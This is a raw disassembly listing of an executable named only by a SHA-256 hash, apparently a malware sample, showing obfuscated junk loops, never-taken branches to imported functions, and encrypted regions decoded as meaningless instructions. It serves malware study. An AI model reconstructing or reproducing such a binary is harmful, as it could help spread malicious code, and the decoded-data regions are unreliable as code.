
6f261ae9bc5b5ed67b4a3229548c5dc3180682905322c28b54beaec79ed5eaf3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433817,0x1c
  401013:	cmp    DWORD PTR ds:0x433817,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433817,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433817,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433817
  401055:	dec    eax
  401056:	mov    ds:0x433817,eax
  40105b:	mov    eax,ds:0x433817
  401060:	dec    eax
  401061:	mov    ds:0x433817,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43381b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43381f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433853
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43382f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433813
  4010b6:	mov    DWORD PTR ds:0x43382f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4338ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43382f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43382f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43382f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43382f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43382f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43382f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43382f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43382f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4337f7
  40113c:	mov    eax,ds:0x4338b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43389b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43377f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43379f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4337db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ebx+0x7e3759d4],bh
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [edx+0x0],bh
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xae43b739
  40126d:	inc    edx
  40126e:	cmp    al,0x64
  401270:	jno    0x401284
  401272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401273:	xchg   esi,eax
  401274:	xor    dl,BYTE PTR fs:[ebx]
  401277:	sbb    ebx,DWORD PTR ds:0x67683e7e
  40127d:	retf   
  40127e:	mov    esi,0x14e700c9
  401283:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401286:	shl    BYTE PTR [eax],1
  401288:	iret   
  401289:	add    DWORD PTR [edx-0x8],ecx
  40128c:	dec    esi
  40128d:	imul   esi,eax,0x33
  401290:	mov    ah,0x72
  401292:	xlat   BYTE PTR ds:[ebx]
  401293:	jae    0x401291
  401295:	fild   WORD PTR [edi+0x5f]
  401298:	test   eax,0x10176f10
  40129d:	daa    
  40129e:	mov    DWORD PTR [eax-0x34],ecx
  4012a1:	mov    cl,0x89
  4012a3:	push   esi
  4012a4:	mov    ecx,0xe04a0569
  4012a9:	cli    
  4012aa:	in     al,0xf2
  4012ac:	mov    ch,0xec
  4012ae:	xor    ah,BYTE PTR [edx-0x31c09cd6]
  4012b4:	inc    eax
  4012b5:	mov    al,0xa9
  4012b7:	xor    BYTE PTR [ebx+0x6a],dh
  4012ba:	add    eax,0x1213b45a
  4012bf:	add    BYTE PTR [ebx],dl
  4012c1:	sbb    al,ch
  4012c3:	imul   edx,DWORD PTR [edx-0x556b1f7c],0x3f
  4012ca:	mov    eax,ds:0xbd4ed268
  4012cf:	dec    eax
  4012d0:	ins    BYTE PTR es:[edi],dx
  4012d1:	jmp    0x27c9:0xc9efb8f7
  4012d8:	rcr    DWORD PTR [eax+eiz*1+0x35d47c77],1
  4012df:	je     0x401281
  4012e1:	fidivr DWORD PTR [eax-0x1c]
  4012e4:	into   
  4012e5:	fwait
  4012e6:	mov    dl,bl
  4012e8:	mov    eax,0x3247044c
  4012ed:	pop    ecx
  4012ee:	fdiv   QWORD PTR [ebp+0x1d]
  4012f1:	sbb    BYTE PTR [ebx+0x14e23f17],cl
  4012f7:	jns    0x401310
  4012f9:	mov    ecx,0x7c28a71f
  4012fe:	mov    ds:0x8c3c8025,al
  401303:	sub    DWORD PTR [ecx],ebp
  401305:	dec    eax
  401306:	push   edi
  401307:	jb     0x40129b
  401309:	imul   BYTE PTR [esp+ebx*4]
  40130c:	and    al,0x26
  40130e:	out    dx,eax
  40130f:	xlat   BYTE PTR ds:[ebx]
  401310:	ficomp DWORD PTR [edi+ecx*2]
  401313:	xchg   cl,dl
  401315:	or     ebp,DWORD PTR [edi-0x1f]
  401318:	je     0x401377
  40131a:	sub    BYTE PTR [ebp-0x5a13a4a5],bh
  401320:	imul   ecx,DWORD PTR [edx-0x23ac166b],0xaaf561c6
  40132a:	xlat   BYTE PTR ds:[ebx]
  40132b:	mov    esp,0x4833ff5
  401330:	or     esp,DWORD PTR [edx-0x69]
  401333:	bound  esp,QWORD PTR [edi]
  401335:	jns    0x4012b9
  401337:	popa   
  401338:	repz repz jne 0x40130b
  40133c:	mov    esi,0xb88ee34b
  401341:	daa    
  401342:	xchg   ecx,eax
  401343:	adc    al,0x84
  401345:	(bad)  
  401346:	dec    edx
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x4337d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4337d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4337d3,ebx
  401366:	cmp    DWORD PTR ds:0x4337d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4337d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43378b,0x43377f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	mov    ch,0x4c
  4013b5:	pop    ebp
  4013b6:	sbb    edx,edi
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401432
  4013c0:	mov    dh,0xd8
  4013c2:	lods   al,BYTE PTR ds:[esi]
  4013c3:	stos   DWORD PTR es:[edi],eax
  4013c4:	mov    ds:0x3a1bef1,al
  4013c9:	inc    esi
  4013ca:	imul   edi,DWORD PTR [ecx+esi*2],0xffffff96
  4013ce:	jno    0x40140c
  4013d0:	and    ebp,esp
  4013d2:	ja     0x401439
  4013d4:	xor    esp,DWORD PTR [ecx-0x17]
  4013d7:	shl    ch,1
  4013d9:	mov    dl,0xaa
  4013db:	rcl    BYTE PTR ds:[esi-0x5b],1
  4013df:	cs in  al,dx
  4013e1:	push   es
  4013e2:	repz jns 0x401441
  4013e5:	dec    ebx
  4013e6:	sbb    BYTE PTR [edx-0x5f],ah
  4013e9:	out    0x16,eax
  4013eb:	lods   eax,DWORD PTR ds:[esi]
  4013ec:	push   edx
  4013ed:	outs   dx,BYTE PTR ds:[esi]
  4013ee:	adc    eax,0xa84c3523
  4013f3:	xor    ecx,DWORD PTR [ebx+eax*2]
  4013f6:	push   ebp
  4013f7:	ins    DWORD PTR es:[edi],dx
  4013f8:	and    eax,0x97e80ef5
  4013fd:	popf   
  4013fe:	hlt    
  4013ff:	(bad)  
  401400:	ficom  WORD PTR [ebx-0x35eebc84]
  401406:	imul   edx,DWORD PTR [edi+ebx*4+0x7d],0x1b03e094
  40140e:	inc    esp
  40140f:	mov    WORD PTR [eax-0x4c],es
  401412:	aam    0x71
  401414:	das    
  401415:	les    edx,FWORD PTR [ebp+edx*8+0xcb100dd]
  40141c:	inc    esi
  40141d:	mov    esp,DWORD PTR ds:0x56b774a0
  401423:	fdivrp st(7),st
  401425:	frstor [eax+0x34db3ebd]
  40142b:	pop    ecx
  40142c:	int    0x1a
  40142e:	call   0xcf801f75
  401433:	cld    
  401434:	leave  
  401435:	clc    
  401436:	out    dx,eax
  401437:	imul   edi,DWORD PTR [esp+ebx*1+0x24],0xffffff9e
  40143c:	jmp    0x8323:0xfcc1acc4
  401443:	mov    bh,0x2c
  401445:	adc    al,BYTE PTR [ecx+0x1d]
  401448:	dec    esp
  401449:	sar    ebx,0x3
  40144c:	je     0x401496
  40144e:	sub    ebx,DWORD PTR [eax]
  401450:	out    0xf8,eax
  401452:	mov    cl,0xa2
  401454:	dec    edx
  401455:	adc    BYTE PTR [esi],0x3f
  401458:	stc    
  401459:	in     eax,0xcf
  40145b:	jbe    0x401458
  40145d:	jns    0x401461
  40145f:	lods   al,BYTE PTR ds:[esi]
  401460:	sbb    BYTE PTR [edi+esi*1],0xea
  401464:	test   eax,0x254e4f22
  401469:	xchg   esi,eax
  40146a:	xor    al,BYTE PTR [ebx+0x11a90ce2]
  401470:	mov    ds,WORD PTR [ebp+0x2394d3fc]
  401476:	jno    0x4014aa
  401478:	jmp    0x1078cf2
  40147d:	mov    ecx,0x36ae1363
  401482:	mov    bh,0x6c
  401484:	inc    esp
  401485:	lahf   
  401486:	shl    bl,0xb6
  401489:	xor    ebp,ecx
  40148b:	daa    
  40148c:	(bad)  
  40148e:	pop    ss
  40148f:	rcl    BYTE PTR [ecx+0x1d],cl
  401492:	dec    eax
  401493:	addr16 jbe 0x401503
  401496:	lahf   
  401497:	push   ds
  401498:	pop    ebx
  401499:	push   esp
  40149a:	popw   ss
  40149c:	mov    DWORD PTR [ecx],0x71e455a0
  4014a2:	scas   al,BYTE PTR es:[edi]
  4014a3:	sub    cl,BYTE PTR [ebp+0xa6afc32]
  4014a9:	adc    DWORD PTR [esi+0x3f],edx
  4014ac:	imul   ebp,DWORD PTR [esi-0x20],0xfe16adf1
  4014b3:	ins    DWORD PTR es:[edi],dx
  4014b4:	mov    ebx,0xc17f5d27
  4014b9:	aad    0x6a
  4014bb:	cld    
  4014bc:	xor    eax,0x3fc6a4bf
  4014c1:	inc    eax
  4014c2:	push   edx
  4014c3:	sbb    eax,0xe98f6d17
  4014c8:	jecxz  0x4014b1
  4014ca:	mov    al,ds:0x9a61f307
  4014cf:	stc    
  4014d0:	das    
  4014d1:	pop    edi
  4014d2:	dec    edi
  4014d3:	mov    BYTE PTR [ebx+0x1792d751],0x8f
  4014da:	push   ecx
  4014db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014dc:	or     eax,0xfcec6fb7
  4014e1:	pop    ds
  4014e2:	cld    
  4014e3:	cwde   
  4014e4:	and    eax,0x44159b13
  4014e9:	int3   
  4014ea:	or     al,0x7b
  4014ec:	mov    ds:0xb726da3a,eax
  4014f1:	push   ds
  4014f2:	add    BYTE PTR [ecx+edx*8-0x6c],bl
  4014f6:	int3   
  4014f7:	enter  0x8d8f,0x58
  4014fb:	test   DWORD PTR [edx-0x7edea1c6],edx
  401501:	sti    
  401502:	stos   DWORD PTR es:[edi],eax
  401503:	mov    esp,0xa8adf8e8
  401508:	cmp    cl,BYTE PTR [eax+0x3c48c08e]
  40150e:	sub    cl,0x3c
  401511:	(bad)  
  401514:	sub    ebp,DWORD PTR [ecx]
  401516:	inc    ecx
  401517:	mov    bl,ch
  401519:	imul   ebx,DWORD PTR [edi],0x2ee6334a
  40151f:	jmp    0x862518d8
  401524:	pushf  
  401525:	push   eax
  401526:	xchg   edi,eax
  401527:	pushf  
  401528:	retf   0xc7f1
  40152b:	or     BYTE PTR [ebx+0x23],0x74
  40152f:	ret    
  401530:	or     bh,bh
  401532:	and    eax,DWORD PTR [ebx+0x61]
  401535:	sbb    ebp,DWORD PTR [esi+edi*8+0x21]
  401539:	fnstenv [edx-0x33]
  40153c:	les    ebp,FWORD PTR cs:[edx+eax*1-0x742b69a9]
  401544:	inc    ebp
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43378f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x4da680e3]
  401564:	aaa    
  401565:	push   es
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401597
  40156e:	jns    0x4015e3
  401570:	test   BYTE PTR [ebx],0x96
  401573:	mov    esp,esp
  401575:	mov    WORD PTR ds:0x22dbba77,gs
  40157b:	jmp    0x15aa3545
  401580:	cmc    
  401581:	xor    DWORD PTR [edi],esp
  401583:	dec    ebx
  401584:	loopne 0x401506
  401586:	sub    al,0xba
  401588:	and    eax,0x4122a22b
  40158d:	pop    edi
  40158e:	inc    esp
  40158f:	aas    
  401590:	shl    BYTE PTR [edx+0xdb90984],0xeb
  401597:	mov    al,0x43
  401599:	cmc    
  40159a:	push   ds
  40159b:	sahf   
  40159c:	sbb    edi,eax
  40159e:	sbb    eax,0x605e8973
  4015a3:	inc    ebx
  4015a4:	daa    
  4015a5:	rcr    DWORD PTR [eax+0x583754ce],1
  4015ab:	int3   
  4015ac:	cmp    al,0xfc
  4015ae:	arpl   bx,cx
  4015b0:	mov    al,dl
  4015b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015b3:	out    dx,al
  4015b4:	das    
  4015b5:	into   
  4015b6:	jl     0x40156a
  4015b8:	push   esp
  4015b9:	or     al,0x9a
  4015bb:	outs   dx,DWORD PTR ds:[esi]
  4015bc:	scas   eax,DWORD PTR es:[edi]
  4015bd:	out    dx,eax
  4015be:	add    BYTE PTR [esi],bl
  4015c0:	lds    esp,FWORD PTR [eax+0x2e]
  4015c3:	in     eax,0xb2
  4015c5:	rcr    BYTE PTR ds:0x6e932a16,cl
  4015cb:	pop    edi
  4015cc:	cmc    
  4015cd:	mov    esp,0x2f1ffacc
  4015d2:	adc    al,0xdc
  4015d4:	in     al,dx
  4015d5:	xor    esp,DWORD PTR [ebx+edi*8+0xce23426]
  4015dc:	pop    edx
  4015dd:	fldenv [edx]
  4015df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e0:	daa    
  4015e1:	push   ecx
  4015e2:	push   es
  4015e3:	(bad)  
  4015e4:	xlat   BYTE PTR ds:[ebx]
  4015e5:	loopne 0x401572
  4015e7:	outs   dx,BYTE PTR ds:[esi]
  4015e8:	inc    esi
  4015e9:	lea    ebp,[ebp+0x77f36cf5]
  4015ef:	fsubr  st(1),st
  4015f1:	lahf   
  4015f2:	test   al,0x9a
  4015f4:	loop   0x401577
  4015f6:	jle    0x4015ac
  4015f8:	js     0x4015d8
  4015fa:	mov    esp,0x4e47d1f6
  4015ff:	ss cmp eax,0x701fe281
  401605:	pop    edi
  401606:	or     bh,cl
  401608:	int3   
  401609:	xchg   BYTE PTR [edi+ebp*4],al
  40160c:	ds aam 0xac
  40160f:	xor    bh,ah
  401611:	cld    
  401612:	popa   
  401613:	jne    0x4015f0
  401615:	xor    edi,DWORD PTR [edx]
  401617:	test   BYTE PTR [edi],0x22
  40161a:	aas    
  40161b:	loope  0x401696
  40161d:	adc    eax,0x9e92dd99
  401622:	mov    eax,0xba50cd3a
  401627:	adc    eax,0x2ba6979c
  40162c:	ja     0x4015e0
  40162e:	std    
  40162f:	xlat   BYTE PTR ds:[ebx]
  401630:	ror    ch,0x99
  401633:	jg     0x40166b
  401635:	mov    esi,DWORD PTR [ecx+0x10355da2]
  40163b:	mov    ebx,0x698bd4c9
  401640:	aas    
  401641:	sbb    BYTE PTR [ecx+0x7f70b887],dl
  401647:	xor    BYTE PTR [esp+edi*2],dh
  40164a:	dec    ebx
  40164b:	neg    BYTE PTR ds:0x3f48589f
  401651:	dec    ecx
  401652:	pop    ss
  401653:	aam    0xe5
  401655:	or     dx,WORD PTR [edx-0x3d]
  401659:	cmp    BYTE PTR [ebp+eiz*4-0x3a4947d7],cl
  401660:	out    dx,al
  401661:	xchg   edx,eax
  401662:	xchg   ebp,eax
  401663:	add    BYTE PTR [ecx-0x6ad4a4e4],0x1
  40166a:	fwait
  40166b:	aas    
  40166c:	mov    edi,0x80f47896
  401671:	mov    ch,0x7e
  401673:	call   0xa7d4:0x87cec96b
  40167a:	add    al,BYTE PTR [ecx+0x1ebe1f9d]
  401680:	lods   eax,DWORD PTR ds:[esi]
  401681:	lods   eax,DWORD PTR ds:[esi]
  401682:	aam    0xe6
  401684:	jae    0x401613
  401686:	mov    ebx,DWORD PTR [ebx]
  401688:	xchg   edi,eax
  401689:	xchg   ebp,eax
  40168a:	xor    BYTE PTR [eax+0x3b],al
  40168d:	retf   
  40168e:	sbb    al,0x54
  401690:	jnp    0x401631
  401692:	frstor [ecx+0x1fee479b]
  401698:	sahf   
  401699:	push   ebp
  40169a:	jno    0x401627
  40169c:	out    dx,eax
  40169d:	mov    cl,0x5
  40169f:	xor    esi,DWORD PTR [edi-0x307e5964]
  4016a5:	pop    ds
  4016a6:	add    esi,ecx
  4016a8:	and    eax,0xbf49d999
  4016ad:	xor    cl,BYTE PTR [eax]
  4016af:	push   gs
  4016b1:	dec    edi
  4016b2:	add    DWORD PTR [edi-0x35],eax
  4016b5:	and    eax,0x4e65cbcd
  4016ba:	mov    al,0x7c
  4016bc:	rcr    BYTE PTR [ecx-0x32],cl
  4016bf:	scas   al,BYTE PTR es:[edi]
  4016c0:	mov    ecx,0x931de503
  4016c5:	leave  
  4016c6:	xor    DWORD PTR [ecx],eax
  4016c8:	xor    BYTE PTR [edi+0x4a91eadb],cl
  4016ce:	shl    ecx,0x50
  4016d1:	xchg   ebx,eax
  4016d2:	xlat   BYTE PTR ds:[ebx]
  4016d3:	xchg   edi,eax
  4016d4:	arpl   WORD PTR [eax+0x5b478c01],si
  4016da:	repnz sbb al,0x7a
  4016dd:	xchg   DWORD PTR [ebx*8-0xaad3816],esp
  4016e4:	jb     0x4016c3
  4016e6:	mov    cl,0x8c
  4016e8:	stc    
  4016e9:	int3   
  4016ea:	jno    0x401732
  4016ec:	xor    al,al
  4016ee:	sbb    DWORD PTR [edx-0x7638fc68],edx
  4016f4:	inc    ebp
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43385f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43385f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43385f,ebx
  401721:	cmp    DWORD PTR ds:0x43385f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43385f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43385f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43385f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43385f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433783,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433797
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43378b
  401793:	and    ecx,DWORD PTR ds:0x4337db
  401799:	mov    DWORD PTR ds:0x43378b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4338af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4338af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4338af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4338af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4338af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4338af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4338af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4338af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433863,0x0
  401819:	mov    eax,ds:0x433863
  40181e:	inc    eax
  40181f:	mov    ds:0x433863,eax
  401824:	cmp    DWORD PTR ds:0x433863,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4337a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433863,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43389f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4338ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4338ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4338ab,ecx
  401878:	cmp    DWORD PTR ds:0x4338ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4338ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4338ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4338ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4338ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x1ac36ade
  4018e9:	push   ds
  4018ea:	pop    ebx
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x401969
  4018f4:	push   ebp
  4018f5:	dec    ebp
  4018f6:	dec    ecx
  4018f7:	push   eax
  4018f8:	cmp    al,0x7b
  4018fa:	xchg   ecx,eax
  4018fb:	mov    esi,0x3b0a4743
  401900:	gs pop ss
  401902:	add    dl,BYTE PTR [edx]
  401904:	loope  0x4018d2
  401906:	pop    esi
  401907:	mov    ch,0xbc
  401909:	mov    ebx,0x99ec06b2
  40190e:	ds jmp 0x3cfe:0x17bd886f
  401916:	imul   esi,DWORD PTR [ecx],0xffffffb7
  401919:	repnz data16 add BYTE PTR [ebp+edi*2-0x4b],ch
  40191f:	hlt    
  401920:	add    al,0x6
  401922:	lock pop ss
  401924:	mov    ah,0x99
  401926:	dec    ebp
  401927:	cmc    
  401928:	pop    edi
  401929:	and    edi,DWORD PTR [ebx]
  40192b:	cmp    DWORD PTR [ebx+edi*2],ebp
  40192e:	outs   dx,DWORD PTR ds:[esi]
  40192f:	and    bh,BYTE PTR [ebx+0x61]
  401932:	jle    0x401998
  401934:	mov    ebp,0xee9f2b39
  401939:	dec    eax
  40193a:	loopne 0x40196d
  40193c:	mov    edx,0x96263c0c
  401941:	arpl   WORD PTR [esi-0x2d50620f],bx
  401947:	cdq    
  401948:	sbb    eax,0x80aef047
  40194d:	and    BYTE PTR [ecx+0x39ce4a78],dl
  401953:	adc    DWORD PTR [eax-0x7c],ecx
  401956:	fwait
  401957:	xchg   edi,eax
  401958:	in     al,dx
  401959:	cld    
  40195a:	outs   dx,DWORD PTR ds:[esi]
  40195b:	imul   ebx,DWORD PTR [edi],0x1c
  40195e:	cmp    eax,0x7f93425a
  401963:	xor    eax,DWORD PTR [ebp+0x2a8c1353]
  401969:	fisubr WORD PTR [ebx+0x4a]
  40196c:	mov    ah,0xd
  40196e:	dec    esp
  40196f:	mov    ebp,0xc85e1217
  401974:	jo     0x401998
  401976:	imul   ecx,esp,0xffffffcb
  401979:	mov    edx,0x3d228e3e
  40197e:	fcom   DWORD PTR [edi+ebx*4-0x3e]
  401982:	push   esi
  401983:	call   0x529e:0x6fc581d1
  40198a:	clc    
